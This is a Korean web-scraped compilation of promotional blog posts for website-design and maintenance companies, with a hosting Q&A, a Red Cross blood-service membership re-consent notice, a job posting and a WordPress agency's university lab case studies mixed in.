월 3만원에바른웹에서 해결할 수 있어요. ​​수년 간의 집약된 노하우로 자체 홈페이지 제작 프로그램을탄탄히 갖추고 있기 때문에 200-300만원에 달하는 홈페이지 제작 (반응형 + PC + 모바일)을 무료로 받을 수 있습니다. ​​특히 반응형 홈페이지는소비자가 접근하는 어떠한 종류의 디바이스에서도 최적화되는 홈페이지로제작 기간도 오래 걸리고 높은 기술력을 요구하는데요.​​​​​ ​​​​​ 홈페이지 오픈까지의전 과정이 의뢰인 분과 본사의 웹디자이너가 긴밀한 의견조율을 통해 진행됩니다.  원하시는 도메인 주소로 제작이 완료된 후, 소유권이 곧장 의뢰인에게 이전되며,바이러스, 스팸차단 등의 방화벽 서비스, 2차 백업 등을 모두 무료로 제공됩니다. ​​하지만 홈페이지는 한번 제작된 것으로 끝이 아니라 사업체가 변화하고성장해감에 따라 마찬가지로 수정, 변경, 관리되어야 하지요. ​​적지 않은 초기비용을 들여 제작만으로 끝나는 것이 아니라월 3만원 씩 60개월 간 의뢰인의 홈페이지가 안전하게 운영될 수 있도록 관리되며, 임의 수정도 가능합니다.(계약 기간 5년 혹은 10년)​​​​ ​​​​​임대형 홈페이지가 아닌주문형 +독립형  홈페이지로 최대 32페이지의 모바일 / PC 홈페이지가 제작되며, 아무런 초기 목돈 지출 없이월 정액 3만원으로 광주 홈페이지 제작, 관리가 이루어지며 계약 기간 후 어떠한 비용도 발생하지 않습니다. ​​따라서 장기적으로 사업체를 운영하실분들께서는 더욱 가성비 높은 서비스를 전문 디자이너로부터 받을 수 있는 기회입니다.​​​​ ​​​​광주 홈페이지 제작과 관리를 위한 적절한 업체가 고민이시라면바른웹에서 제작과 유지보수를고려해보시길 바래요. ​​아래 링크 통해 문의하시면서 바른웹의 포트폴리오도 확인해 보세요. ​​​ (아래를 클릭하세요) ​​ ​ ​​​​ 모바일홈페이지제작이나 웹사이트 제작합리적인 가격으로 쉽게 빠르게 할 수 있는마케팅닷컴을 소개합니다!당일제작도 가능하니 문의사항은1599-3391 / 010-8887-3215마케팅닷컴으로 문의주시면 되겠습니다! 요즘에는 마케팅 광고 없는 광고는 생각할 수없을 정도로 온라인에서 많은 광고를 하곤 하는데요-이 모든 광고들의 근간이 되는것이 바로홈페이지 입니다.그래서 많은 업체에서 홈페이지에 신경을많이 쓰곤 하죠- 홈페이지 역시 트랜드에 따라심플하고 깔끔한것을 많이 선호하고 계십니다.모바일과 웹사이트 둘 다 놓치고 갈 수없는 부분이라 이 두가지를 같이관리가 될 수 있는 홈페이지제작업체를선정하는것이 좋습니다.홈페이지 제작 업체를 선정할 때 많은 분들이가격과 디자인 등 많은 것을 고려합니다.하지만 업체별로 홈페이지 제작 가격이천차만별이기 때문에 여러군데 따져보고결정하는것이 좋은데요-홈페이지 관리를 해주는지, 업데이트는어떻게 되는지, 디자인 샘플 등 많은것을고려하여 업체를 선정하곤 하는데그 중에서도 공유경제단체기업으로정부에서 지정서를 취득한 마케팅닷컴에많은 문의가 오시곤 합니다.마케팅에 필요한 스튜디오도 보유하고 있어필요한 사진이 있으면 언제든지 가서촬영을 해드리고 있는 마케팅닷컴.한번 맡은 고객은 끝까지 책임지는마케팅닷컴에 홈페이지 문의 및마케팅 문의 있으면 언제든지연락주시면 친절하게 설명해드리고 있습니다 :)IT컨설턴트 온누리웹입니다. 질문홈페이지를 만들어주는 업체에서 홈페이지를 제작해서 관리까지 맡겨 놓구 제작비용과 월관리비를 내고 잇읍니다.     그런데  얼마동안은 방문자가 하루 100명정도 였다가  오버추어광고를 냈더니  방문자가 하루 2000명 정도로많아졌읍니다. 그런데 저녘7시경 홈페이지에 들어갔더니 하루데이터량초과 라고뜨면서 홈페이지가 안나오내요..12시가넘어야 정상 작동한다고 써있구요. 궁금한 질문좀 드리겠읍니다. 1.하루데이터량을 늘리려면 업체에 돈을 추가해줘야 하나요? 2.홈페이지의 자료와정보를 많이올려서 방문자당 페이지뷰를 늘리고  광고를더내서      하루 방문자수를 5000 명이상까지 늘리려 하는데 이것또한 추가요금이  더들까요.? 3.홈페이지 도매인은 그업체 명의로 되어 있는건가요? 4,만약 도메인이 그업체명의로 되어있다면  우리명의로 바굴수 있는방법..? 5,서버를 구입하다면  하루10000명에 일인당 평균50페이지뷰 정도 용량의 서버의 대략 가격?? 6,서버 운영및 사용하기는 쉽나요???  답변호스팅에 트래픽 제한이 걸리신겁니다.업체에서 자체적으로 했을수도 있지만, 관리한다고 하구선.. 다른곳에 호스팅을 맞겼을 수도 있습니다. 1. 하루테이터량 즉 1일 트래픽을 늘리려면 호스팅 비용이 추가로 발생하게 됩니다.호스팅 업체의 상품군 혹은 트래픽 추가를 이용하시면 됩니다. 2. 자료와 정보는 DB라고 합니다. DB용량과 1일 트래픽 용량은 다른것입니다.이 역시 호스팅 업체와 상의를 해보셔야 합니다. 3. 홈페이지 도메인? 직접 신청하지 않으셨나요?도메인은 비용은 내셨겠지요? 그렇다면 당연히 소유권은 의뢰자에게 있어야 합니다. 4. 당연히 바꿔야 합니다. 도메인 등록업체에 원하는 서류를 제출하고 소유권이전 신청을 하면 됩니다.whois.nida.or.kr 여기 들어가서 님이 현재 사용하고 있는 도메인을 검색하면, 호스팅 업체 정보와 도메인 등록업체가 나옵니다. 그걸 확인해보시면 됩니다. 5. 서버를 구입한다는건, 기본 서버를 구입해도 충분하실꺼 같습니다.다만, 트래픽에 따른 용량은 회선비용이며 이는 별도로 청구됩니다.서버를 구입해서 직접 회선깔고 운영하시는것보다는 코로케이션 시스템을 운영하는 호스팅 업체에 문의하시는것이 빠릅니다. 6. 서버 운영하기 쉽진 않습니다. ^^ 그에 대한 지식이 있어야 합니다. 우선. 호스팅이 막혔다고 한다면.. 님이 사용하는 호스팅에 대한 정보를 요구하셔야 합니다.대부분 호스팅업체에 마이페이지가 있어서, DB사용량과 트래픽정보를 보실수 있습니다. 제 생각에는 아직 서버까지는 필요없다고 생각됩니다.우선 호스팅 용량을 늘리시고, 그래도 용량이 모자라다면 서버 호스팅을 받는편이 저렴합니다.그래도 속도나 용량이 만족스럽지 않다면.. 그때 서버를 구입하시면 됩니다.서버의 경우 100만원~수천만원까지 있습니다.아무 지식없이 관리인원도 없이 서버를 구매하시면 더 고생하십니다. 도움이 되셨으면 합니다. 좋은 하루 되세요~원문 url http://kin.naver.com/detail/detail.php?d1id=1&dir_id=109&eid=PSgxMutnKZ/znBK6avKncdDs0eEtvvRV환절기 건강관리 다들 잘 하고 계신거죠?환절기에는 면역력이 쉽게 떨어진다고 하는데요.이런 때 따뜻한 차나 물을 많이 섭취해 주는 게 좋다고 합니다.생활에 유용한 홈페이지제작및관리 팁들을 두루 모아 봤습니다^^포스팅 보시면서 가볍게 차 한잔, 어떠세요?홈페이지 관리 업체를 선택할 때는 그때그때 유지 보수가 이루어질 수 있는지, 전문 인력이 있는지, 회사가 탄탄하게 운영되고 있는지 파악해야 합니다. 그리고 과도하게 저렴하게 홈페이지를 만들어주는 업체를 쓰는 경우사후관리가 상세하게 이루어지지 않을 수 있기 때문에 홈페이지 이용 도중 문제가 생길 수 있으니 조심해야 합니다.또한 홈페이지 관리업체를 선정할 때는 오타, 프로그램 오류시정, 팝업 이미지 제공 등과 같은 기본적인 홈페이지 유지 보수가 이루어지는지 살펴 보아야 한답니다.그리고 홈페이지를 실제로 제작하면 다양한 변수들이 발생하곤 하는데요. 때문에 홈페이지 제작 계획을 짤 때는 구체적으로 내용을 협의하는 것이 좋은 방법입니다.또 홈페이지 제작을 의뢰할 시에 홈페이지를 무료로 제작해주고 추후 유지보수비와 홈페이지 임대료를 요구하는 업체들이 있다고 하는데요. 그렇기 때문에 계약 조건은 한번 더 검토하는 것이 좋습니다. 무료로 웹페이지를 제작할 수 있는 사이트가 있기 때문에 어느 누구나 간단히 제작할 수 있지만어떤 컨텐츠를 어떤 용도로 활용하느냐에 따라서 잘 만든 홈페이지와 그렇지 못한 것으로 갈립니다.그리고 인터넷 사용자 수가 4천만을 넘어서면서 인터넷은 대중에게 일반화되었죠. 온라인 쇼핑이나 소셜커머스 등, e비즈니스 시장은 매년 큰 폭으로 성장하는 모습을 보이고 있습니다.또 홈페이지 제작은 사이트에 업로드할 것을 분석, 기획하고 그에 따라 구성을 설계하는데요. 이어 사이트를 올릴 웹 서버 공간을 준비하고 문서를 업로드 한 후 널리 홍보함으로써 완성됩니다.그리고 온라인 마케팅을 진행하는 기업들은 갈수록 치열해지는 경쟁 상황 가운데보다 차별화된 마케팅 전략을 펼치기 위해 노력하고 있습니다.또한 수출업체 홈페이지의 경우 인터넷익스플로어, Firefox, Safari 따위의 웹브라우저에 호환성이 유지하도록 홈페이지를 제작하고 수정해야 하는데요. 그렇지 않으면 잠재고객의 접근을 본질적으로 불가능하게 하는 결과를 가져올 것입니다.관능적이며 고객의 호기심을 끌어당기는 웹디자인을 원하신다면 디자인팩토리를 찾아주세요.디자인팩토리는 웹사이트부터 모바일 앱, 모바일어플 등 IT 기반의 디자인 솔루션을 제공하는디자인전문업체로 많은 고객으로부터 사랑받고 있습니다.한 획의 글자, 하나의 점에도 생각하고 또 생각하며 제작하고 있으며 소비자가 사용하기 수월하고인상깊은 업체가 될 수 있는 효율적인 디자인을 지향하고 있습니다.마케팅적 지식과 디자인적 노하우로 양질의 디자인을 제작해 드리겠습니다.홈페이지제작및관리에 대한 정보, 머릿속에 쏙쏙 기억해두셨나요?시작이 반이다! 라는 말처럼  오늘 홈페이지제작및관리에 대해 공부했으니 벌써 반은 온 거나 다름없어요~ 나머지 반을 위해 더 좋은 정보 준비하도록 하겠습니다 ^^네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지관리(2020.09.21)  네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지제작및관리, 클릭 상식!홈페이지 빌더, 자세히 알아보기가끔 너무 큰 기대로 인해 실망을 느낄 때가 있습니다.사랑이든 대인관계든 시험 결과든 크지 않은 기대가 더 큰 행복을 안겨주기 마련이죠.너무 큰 기대로 앞으로 생겨날 행복을 갉아먹기보다는 있는 그대로 만족하는 마음가짐이 필요합니다. ^^그럼, 적당한 기대감으로~ 오늘도 홈페이지제작및관리 관련 유익한 정보를 알아볼게요!홈페이지 빌더는 기본적으로 제공이 되는 레이아웃을 통하여서 사용자가 원하는대로 홈페이지를 제작할 수 있는 방식을 말합니다.그리고, 사용자가 폰트나 이미지의 위치, 크기, 메뉴와 게시판 등을 조절할 수 있어홈페이지를 다양하고 자유롭게 디자인할 수 있다는 장점을 가지고 있습니다.디자인 능력이나 프로그래밍 지식이 있지 않아도 홈페이지를 간단히 만들 수 있는데요.홈페이지 빌더를 이용하면 기본적으로 제공되는 홈페이지 디자인에서사용자가 알아서 사진이나 내용을 수정을 할 수 있으며, 주기적으로 홈페이지를 관리할 수도 있으며,맞춤형과 템플릿형 홈페이지의 장단점을 섞은 방식이 바로 홈페이지 빌더입니다.완성도 있는 디자인으로 부담되지 않게 홈페이지를 제작할 수 있기 때문인데요.최근에는 새로운 디자인의 레이아웃을 제공하는 업체가 증가하고 있고,직접 만든 스킨을 적용할 수도 있어, 고급스러운 홈페이지 제작도 가능해졌습니다.홈페이지 빌더를 이용하면 코딩 없이 쉽게 홈페이지를 만들 수 있는데요.업종별로 다양하게 제공되는 템플릿 중에서 사용자가 고르고싶은 디자인을 직접 골라서카테고리나 메뉴의 크기, 레이아웃을 쉽게 수정할 수 있으며,온라인상에서도 바로 적용할 수 있습니다.이제 홈페이지 뿐만아니고, 블로그나 SNS를 통한 업체 홍보가 필수인 시대입니다.따라서 기존 홈페이지를 별도의 모바일 버전으로 따로 제작하는 대신에하나의 홈페이지를 제작하면 모든 종류의 디스플레이에서 최적화 될 수 있는반응형 홈페이지 빌더가 각광받고 있습니다.철저하게 알아보자! 홈페이지 백업에 대해!자신이 가진 홈페이지 계정 공간 상에 데이터 파일들을 올리는 방법은 내 개인컴퓨터에에 저장한 파일을 웹 서버상에 보내서 저장 시키는 것이며,홈페이지 디자인을 전문회사에 맡겼을 시에는 백업 계약도 약정해 놓으면 좋은데요.계약 목록에 지정된 기간마다 백업 파일을 제공받기로 명시해 둔다면안전하게 보장받을 수 있기 때문입니다.홈페이지 관리 중 컨텐츠나 페이지를 과실로 삭제했을 경우를 대비해 백업 작업은 필수입니다.홈페이지를 확실히 백업해 놓았다면 언제든지 원상복구가 가능합니다.구축이 완료된 홈페이지를 타인에게 보여지도록 하기 위해서는 웹 서비스가 가능한 홈페이지의 사이트 서버에 나의 홈페이지 문서파일을 올려야 하는데요, 이 때 서버라는 건, 클라이언트의 요청에 반응하는 프로그램을 의미합니다.파일 전송 프로그램인 FTP를 이용하여 창 좌측에 있는 폴더에 저장된 특정 파일들을 더블클릭함으로써 홈페이지의 서버에 업로드 할 수 있습니다.온라인 창업에 꼭 필요한, 홈페이지! 만들긴 만들었는데, 관리가 어렵다고요?홈페이지 제작에서 사후관리, 유지보수, 마케팅까지 모두 종합적으로 해결해 드리는 다브가 확실하게 책임지겠습니다!다브는 홈페이지 제작 뿐만 아니라 관리자 모드를 설치, 업데이트나 수정사항을 고객님 스스로설정할 수 있어 관리비 금액 부담이 없습니다. 또한, 제작비는 무료! 호스팅 비용만으로모바일 홈페이지까지 동시에 제작할 수 있는 알찬 혜택도 제공하는데요.또한 다국어 시스템이 마련된 자동 번역 쇼핑몰 온라인 사이트도 제작, 해외에서 통하는 쇼핑몰 솔루션으로 놀라운 가성비를 자랑합니다.홈페이지 설립 후 컴퓨터에 대해 전혀 모르시는 고객도,마케팅 솔루션을 분석하고 싶은 고객도 다브와 함께라면 편리해집니다. 지금 문의하세요!착한 가격으로 쉽고 빠르게 홈페이지, 쇼핑몰 제작홈페이지제작및관리에 대한 정보는 여기까지입니다!조금이라도 도움이 되셨나요?제가 계속해서 유익한 정보를 전해드리도록 하겠습니다!​​대한적십자사 혈액관리본부 회원님들, 좋은 아침입니다!매일 공식블로그를 통해 여러분께 인사드리면서, 오늘은 어떤 이야기를 전달하면 좋을지 고민을 하게 됩니다.​헌혈에 관한 정보나 재미난 일상 이야기, 좋은 소식, 좋지 않은 소식 등 여러분과 다양한 이야기를 나누며 소통할 수 있기를 바라는 혈액관리본부의 마음 잘 알고 계시리라 생각합니다.^^​​​​또한 많은 분들이 혈액관리본부 공식 블로그는 물론 홈페이지를 통해서도 함께 이야기해주고 계신데요, ​​2014년 4월 1일부터 혈액관리본부 홈페이지 회원제 서비스의 원활한 이용과 안전한 개인정보를 위해 홈페이지 회원정보 재동의를 시행해오고 있습니다.     ​​● 홈페이지 회원정보 재동의 시행 안내 ●​1. 안전행정부 표준개인정보보호지침이 ​아래와 같이 개정(2011.9.30)됨에 따라, 홈페이지 회원은 ​2년을 주기로 재동의 절차를 거쳐 동의한 경우에만 회원 자격을 유지할 수 있습니다.​※ 안전행정부 표준개인정보보호지침 제64조 (개인정보파일 보유기간의 산정)정정책고객, 홈페이지 회원 등의 홍보 및 대국민서비스 목적의 외부고객 명부는 특별한 경우를 제외하고는2년을 주기로 정보주체의 재동의 절차를 거쳐 동의한 경우에만 계속적으로 보유할 수 있다.​2. ​이에 따라, 2014년 4월 1일부터 회원정보 재동의를 시행해오고 있으며,회원정보 재동의는 혈액관리본부 홈페이지에 로그인하여 재동의 의사를 표명 하여야 하며, 재동의를 하지 않을 경우 2년 도래일 익일 자동 탈퇴 처리됩니다.​3. 재동의가 요구되는 회원이 로그인 하시는 경우, 재동의 안내가 나오며 이에 동의해 주시면 됩니다.재동의 대상이 아니신 회원님들은 안내문구가 나오지 않습니다.​​​​​혈액관리본부 홈페이지를 이용해 주시는 많은 회원님께 감사드리며,혈액관리본부 홈페이지에 로그인하시어 회원자격을 유지해 주시길 바랍니다.​대한적십자사 혈액관리본부는 앞으로도 보다 안정적인 홈페이지 운영을 위해 최선을 다하겠습니다.더불어 혈액관리본부 공식 블로그와 페이스북을 통해 여러분들께 한 발 더 가까이 다가갈 수 있도록 노력하겠습니다.​감사합니다.   ​​​네이버 블로그는 맞지만, 확인불가안녕하세요~ 식당홈페이지제작전문 별찌입니다.식당 오픈하고 제일 고민되는 식당홍보 및 마케팅!​이제 식당도 홈페이지를 통해 관리를 하세요. 고객의 유입 및 검색 분석과 신뢰감 있는 정보 소개로 손님들을 이끌 수 있습니다.    보통 식당 홍보는 블로그 위주죠. 하지만 매일매일 꾸준한 관리에 블로그 홍보가 쉽지만은 않습니다.​ 식당 홈페이지는 정보의 신뢰감을 주고 믿을 수 있는 많은 정보를 제공할 수 있습니다.​   식당 홈페이지 제작을  하시면검색 시 내 식당이 네이버 및 사이트에 등록이 되어서 많은 사람들에게 노출이 됩니다.​별찌는 홈페이지 제작하시면 이 사이트 등록까지 무료로 해드립니다.   식당 홈페이지를 제작하시면 매장 관리의 효율을 극대화!자세한 메뉴 및 오시는 길 소개는 기본이고.우리 식당을 어떤 사이트, 어떤 검색어로 유입을 했는지 분석이 됩니다. ​   많이 노출되는 사이트, 검색어로 광고를 하고 홍보를 한다면 타깃률 100%!유입 도메인 및 어떤 링크를 타고 왔는지 유입 URL도 제공이 됩니다. ​   물론 별찌는 최신 기술의 반응형 홈페이지 이기 때문에 추가비용 없이 모바일 홈페이지도 완벽 연동, 지원이 됩니다. ​   저렴한 제작가격에 1+1 이상의 효과까지!모바일에서도 언제든지 홈페이지 관리, 고객 관리를 할 수 있습니다. ​   장기 관리 시 경제적인 홈페이지 제작을 하세요.별찌는 초기 제작비 이외에 추가 비용, 유지관리 비용이 없습니다. ​식당 공지 및 휴무안내에 꼭 필요한 팝업/배너 기능까지 무료!경제적이고 효율적인 홈페이지 관리가 가능합니다.​   입력폼 기능으로 PC 및 모바일에서프랜차이즈 식당 문의를 받을 수 있고고객들의 문의 및 예약을 받을 수 있습니다.  반응형홈페이지제작,반응형쇼핑몰제작,어플제작홈페이지제작,반응형홈페이지제작,쇼핑몰제작,웹사이트제작,어플제작,비용문의,기업홈페이지제작,사이트등록byulzzi.com 문의를 주시면 1:1 전담 담당자님과 미팅 및 상담을 통해업체 특성에 맞는 최고, 최적의 홈페이지로 처음부터 끝까지  책임지고 제작해드립니다.​견적 및 상담문의는 언제든 환영입니다.감사합니다 :) 모집부문 및 자격요건 모집분야 모집인원 담당업무 / 자격요건 및 우대사항디자인(시각 / 제품)1명 담당업무- 홈페이지관리,홍보 마케팅,기타 시각디자인- 근무부서 : 디자인  자격요건- 경력 : 경력 1년 이상  우대사항- 해당직무 인턴경력- 컴퓨터활용능력 우수- 인근거주자- 운전가능자- 해당직무 근무경험- 문서작성 우수자- 엑셀 고급능력자- CAD/CAM 능숙자- 포토샵 능숙자- FLASH 능숙자- MAC/편집 전문가- PPT능력 우수자지원자격학력대졸 이상 (2,3년)성별무관연령23세~46세근무조건 및 근무환경근무형태정규직(수습기간)-2개월근무요일/시간주 5일(월~금) 오전 8:30~ 오후 6시근무지역대구 - 북구급여2,600~2,800만원(퇴직금포함)회사주소(702-010) 대구 북구 산격동 1665번지 전기재료관 다동 123호전형절차 및 제출서류전형절차서류전형1차면접2차면접최종합격제출서류이력서.자기소개서, 포트폴리오접수기간 및 방법접수기간2020년 5월 4일 (월) 16시 ~ 2020년 7월 3일 (금) 24시이력서양식사람인 온라인 이력서접수방법사람인 입사지원, FAX 지원, 전화 지원, 회사방문 접수기타 유의사항입사지원 서류에 허위사실이 발견될 경우, 채용확정 이후라도 채용이 취소될 수 있습니다. [대원전기] 홈페이지,블로그,쇼핑몰 관리 및 디자인 (시각,제품)(D-58) - 사람인대원전기, 홈페이지,블로그,쇼핑몰 관리 및 디자인 (시각,제품), 경력:경력 1년 이상, 학력:대학졸업(2,3년)이상, 연봉:2,600~2,800만원 , 홈페이지:www.saramin.co.kr #대구, #대구취업, #취업, #취업공고, #스터디, #동영상촬영 대학 개별 학과 및 연구실 (LAB)의 경우 대학교 홈페이지와 달리 자체적으로 홈페이지를 제작하는 경우가 많습니다. 대학 연구실 및 개별 학과 부속기관의 경우  주기적인 업데이트 및 홈페이지 관리를 직접 하여야 하므로 기존 홈페이지 제작 방식보다는 워드프레스를 통해 운영 관리가 쉽게 제작이 이루어지고 있습니다. 오늘은 개별 대학 연구실, 부속기관 홈페이지 제작 사례 공유드립니다. ​1. 서울대학교 환경대학원 포용적 계획 정책 연구실(Inclusive Pkanning & Policy LAB: IPP LAB) 기존 제작된 홈페이지의 레이아웃 콘셉트를 유지하고 회원가입 및 서버 이전 메인, 세부 페이지의 UX를 개선하는 작업으로 새롭게 호스팅을 이전하여 리뉴얼 제작한 사례로 연구실 식구들만의 커뮤니티를 새롭게 만들어 회원가입 형태로 폐쇄형 게시판을 제작하였습니다. ​사이트 제작 사례는 아래 영상으로 확인하실 수 있습니다.    2. 연세대학교 환경공간정보 및 방재 연구실  연세대학교 도시공학과 환경 공간정보 및 방재연구실 제작 사례입니다. 학교의 아이덴티티를 최대한 활용하여 박스 형태의 콘셉트로 제작한 사례입니다. 자세한 내용은 아래 동영상으로 확인 가능합니다. ​   3. 한국외국어대학교 세미오시스연구센터 웨비나(Webinnar) 홈페이지  한국외국어대학교 세미오시스 연구센터의 글로벌 컨퍼런스를 위한 홈페이지 제작 사례입니다. 웨비나 형태로 비실시간 컨퍼런스를 진행하였고 개별 연자들의 발표는 허락된(회원가입 사후 승인) 참가자들만 회원가입을 통해서만 노출되는 컨퍼런스 형태로 진행하였습니다. 콘텐츠는 비메오 컨버팅 스트리밍으로 진행하였고, 일부 MP3 음성파일로도 진행한 사례입니다. ​아래는 본 컨퍼런스 사이트를 이용하여 추가적으로 학술대회를  진행한 사례입니다. 1차 제작 후 실제 프레임 제작은 4일 정도 소요되었습니다. 코로나 비대면 정국이 지속적으로 진행되고 있을 때 각 학교에서는 웨비나 형태의 컨퍼런스 학술대회를 지속적으로 진행할 것으로 판단됩니다. ​ 자세한 내용은 동영상으로 확인 가능합니다.   ​​대학 산하 연구소 및 부속기관마다 차이가 있겠지만 대부분의 경우 한정된 예산으로 홈페이지 제작을 진행합니다.  웹에 관련된 전문적 지식이 없다 보니 제작 예산 및 기간, 기획 등의 이슈가 있어서 프리랜서 제작자를 통해 제작을 의뢰하다가 낭패를 보는 경우를 많이 보았습니다. 대학교 학과 및 연구소 산하기관의 경우  홈페이지 오픈 후 지속적으로 유지 관리 및 업데이트가 필요합니다. 홈페이지 제작 시 각 연구소 및 기관의 특성 및 콘텐츠의 특성을 이해하고 기획하고 제작 후  지속적으로 유지관리가 가능할 수 있게 처음부터 함께 밀접하게 제작에 참여하는 방식이 매우 중요합니다. (제작 기간 2주 ~ 4주) ​셀럽워드프레스 지식공유 콘텐츠입니다. ​ 워드프레스 홈페이지 제작전문 - 셀럽워드프레스2013년 부터 워드프레스 국내 확산을 위해 셀럽워드프레스는 다양한 교육 및 전파 활동을 전개 하고 있으며 워드프레스 홈페이제 제작, 컨설팅, 기획, 제작사례 전파 기업 컨설팅등 기업 전략에 맞는 홈페이지 제작을 지원하고 있습니다.celebwordpress.com ​​ 오늘은 홈페이지 제작 사례 보다는 관리자 페이지 제작 사례를 보여드릴려고 해요! 홈페이지던지 어플이던지,뭐든 관리자 페이지가 필요한 건 알고 계시죠?^^ 어플이라고 할지라도 컴퓨터로 손쉽게 관리할 수 있는 관리자페이지가 참 중요해요! 영자닷컴에서는 관리자페이지도 깔끔하고 보기 쉽게 만드는데요!홈페이지관리도 영자닷컴과 만나면 달라질 수 있습니다!    한국태권도에서 만든 관리자페이지인데요.홈페이지관리를 쉽게 하기 위해서 만든 것이랍니다.한눈에 보기에도 깔끔하게 되어 있죠?^^홈페이지도 참 중요하지만 관리자페이지에서 회원 및 다양한 정보들을어떻게 관리하느냐가 참 중요한 것 같아요.  도표로도 나오는 관리자페이지!뭐든 도표로 봐야지 한 눈에 제대로 볼 수 있는 것 같아요.원하시는 기능을 알려주시면 요렇게 해드릴 수 있답니다.^^홈페이지관리 참 쉬워졌죠?ㅎㅎㅎ카테고리예요.이것 역시 고객님이 원하시는 대로 가능하답니다.회원들의 정보를 손 쉽게 관리 할 수 있어요. 정보유출로 인해 처음 초기 화면 테스트 페이지예요.이름, 상태 등을 손쉽게 확인하는 것은 물론   생일 등 기념일도 관리할 수 있답니다. 회원들이 얼마나 늘었는지 줄었는지가 가장 중요하기에이 부분은 도표로 나타냈어요.타인들이 보는 페이지가 아닐지라도 정성껏 만들어 드리는 영자닷컴 홈페이지, 어플 영자닷컴과 함께해보세요!영자닷컴 문의는 053-474-3979랍니다!​​    홈페이지제작및관리, 알짜 제작 정보! 홈페이지 제작 업체 선정에 관한 알짜배기 팁 공개!      내가 찾는 정보는 항상 잘 안 보이는 경우가 많습니다.이럴 땐 정말 우울한데요ㅠㅠ제가 제공해드리는 정보가 여러분이 원하는 정보였으면 하는 바람으로홈페이지제작및관리에 관해 설명드릴게요!     일반인이 홈페이지를 제작하는 사유는 보통 자신이 제작한 홈페이지 문서를 웹에 올려 놓을     저장공간을 사용하기 위해서인데요. 따라서 홈페이지를 만드는 사이트를 고를 시엔 신뢰성, 접속속도, 저장용량, 파일업로드의 간편한 정도 등의 요소를 비교하도록 합니다.    그리고 홈페이지를 제작하게 된다면 그 방법과 비용, 기간, 방향이 회사마다 모두 다르기 때문에 업체가 기대하는 사업의 지향점을 정확히 전달해야 함을 명심하세요.또 홈페이지 관리업체를 선정할 때는 오타, 프로그램 오류시정, 팝업 이미지 제공 등과 같은 기본적인 홈페이지 유지 보수가 제공되는지 체크해야 합니다.또한, 홈페이지는 업종에 따라 다른 유지보수비용이 발생하는데요. 계약 시에는 저렴하다는 업체의 말에 속아 홈페이지를 제작하였다가 월 관리비와 추가비용이 발생할 수 있으니 유의해야 합니다.     그 다음으로, 홈페이지 제작한 후에 문제가 발생한 상황에는 보수가 무상으로     진행될 수도 있으니, 계약 시 하자 보수와 관련한 무상 이행 여부를 꼼꼼히 살펴보는 것이 필요해요.    간단히 짚고 넘어가면 좋아요! 홈페이지 코딩 프로그램 핵심 지식    홈페이지를 제작할 때 개별적으로 디자인을 작업했다고 하더라도 완벽한 사이트를 마련하기 위해서 사이트 HTML 코딩 단계가 필요합니다.기본적으로 홈페이지를 인터넷에 구축하기 위해 컴퓨터가 알 수 있는 언어로 전환하여 등록을 해 주어야 하는데, 앞서 말한 컴퓨터가 파악할 수 있는 언어로 바꿔주는 일련의 과정을 코딩이라고 합니다.이러한, 홈페이지를 제작할 때 가장 중요한 코딩의 사전적 뜻은 ‘부호화한다’는 뜻입니다.컴퓨터 기계에게 말하기 위하여 컴퓨터 언어인 코딩이 우선적으로 필요한 것이죠.또 코딩 과정에서, HTML 문서의 파일명은 홈페이지를 구동하는 역할을 하는데요. 통상 index.html로 만들어야 정상적으로 구동합니다. 그런데 몇몇의 무료 계정 사이트들은문서 명칭을 default. Html로 해야 정상작동하는 경우도 있어 해당 사이트에서 반드시 확인해야 해요.     그리고 보다 세련되게 페이지를 만들려면 홈페이지에 디자인 소스를 입힐 수 있는 스타일 시트를     이용해야 하며, 액션이 있는 홈페이지를 만들기 위해서는 자바스크립트를 입히는 것이 좋아요.    인터넷의 발달로 먼 거리 결제가 필요하신 분들 주목하세요!       세계에서 가장 간단한 결제시스템, 심페이를 만나면 결제가 즐거워집니다.          심페이는 신용카드 기본 정보만으로 결제가 가능하며 국내의 전 카드에 적용됩니다.단 한 번의 가입으로 수기/쇼핑몰/SMS/ARS/SNS 서비스 모두 오케이!3.2% 최저의 수수료로 비용걱정 없이 편하게 사용하세요.     늘 고객님의 사업에 도움을 주는 비즈니스 파트너가 될 심페이!특별한 서비스의 결제시스템을 바로 누려보세요. 상담문의 >> 070  4065  6617       수기결제         전문 심페이[둘러보기]         무언가에 푹 빠져 보고 나면 배고파지는 느낌, 다들 아시나요?방금 살펴본 홈페이지제작및관리 내용에 폭 빠져있다 정신 차리니 역시 배가 고파지네요! ^^오늘은 따뜻한 국물요리가 먹고 싶은데, 이웃님들의 식사 메뉴는 무엇인가요?저는 순대국 한 그릇 뚝딱 하려고요. 입이 즐거워지는 식사 하세요! 홈페이지 유지관리 무료 지원해주는 월관리비가 필요없는 대전홈페이지제작업체 하나솔루션대전 홈페이지제작 하나솔루션천고마비의 계절 가을입니다.가을하늘을 보니 높고 푸르른것이 내마음이 높고 넓어지는것 같네요오늘도 행복하시고 즐겁게 하루를 보내시길 바랍니다.모두 모두 홧팅으로 시작하는 행복한 하루가 되세요  저희 하나솔루션 홈페이지제작업체는 항상 여러분들에 곁에 있습니다.홈페이지를 원하시는 분들은 언제든지 전화하시면 성심을 다해서 답변해드리겠습니다.웹반응형으로 제작해드리며광고및 홍보에 최대한 맞춰드리고 있습니다.  저희 대전홈페이지제작업체에서는 유지관리와 a/s무상 처리해드립니다하나솔루션 고객은 영원한 고객으로 모시고 있으며유지관리도 무상이지만원하시는 유지관리팝업창, 이벤트창, 상품등록, 페이지추가, 게시판추가, 폼메일추가 이미지 리뉴얼등무상으로 작업해 드리고 있으니 고객분들 한분한분들께서 소중하시고 한가족처럼홈페이지가 성공하는 날까지 끝까지 책임지고 도와드리고 있습니다.  마케팅광고또한 무료로 도와드리고 있습니다.노하우전수뿐만아니라네이버키워드 관리대행으로 세팅해드립니다.네이버 쇼핑입점과 블로그제작 카페제작 모두 무상으로 제작해드립니다포스팅 노하우전수해드립니다.대전홈페이지제작 둔산동에 위치하고 있습니다.대전홈페이지제작하면 하나솔루션입니다.  네이버 블로그와 카페제작 무료로 처리해드립니다.하나솔루션 고객이면 네이버 블로그 카페제작을 무료로 제작해드리니블로그가 필요하신분들은 저희 하나솔루션에서 홈페이지도 만드시고 블로그도 만드시니일석이조인 셈입니다.대전홈페이지제작 하나솔루션입니다.한번고객은 영원한 고객으로 모시겠습니다.  